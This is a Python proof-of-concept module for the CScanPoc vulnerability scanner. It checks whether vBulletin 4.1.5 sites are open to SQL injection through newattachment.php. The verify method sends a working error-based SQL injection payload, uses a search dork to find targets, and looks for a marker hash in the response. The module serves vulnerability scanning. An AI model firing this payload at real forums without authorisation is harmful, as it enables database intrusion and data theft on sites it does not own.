# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'vBulletin_0002'  # 平台漏洞编号，留空
    name = 'vBulletin 4.1.5 attachment SQLI'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2013-03-25'  # 漏洞公布时间
    desc = '''
        vBulletin是美国Internet Brands和vBulletin Solutions公司共同开发的一款开源的商业Web论坛程序。
        vbulletin 4.1.5 attachment SQLI
        examine variables came across sq-injection, as later found to be inherent to all vbulletin 4.1.5.
        Title: Vulnerability in vBulletin 4.1.5
        Dork: Powered by Powered by vBulletin 4.1.5
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/415/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'vBulletin'  # 漏洞应用名称
    product_version = 'vBulletin 4.1.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'b068f130-a21b-4813-a84c-d8e00a596f9d'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-12'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/board/newattachment.php?do=assetmanager&values[f]=-1599+or(1,2)=(select*from(select+name_const(md5(c),1),name_const(version(),1))a)&contenttypeid=18&poststarttime=1360663633&posthash=4f5c850593e10c5450d9e880d58a56d8&insertinline=1"
            url = self.target + payload
            r = requests.get(url)
            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
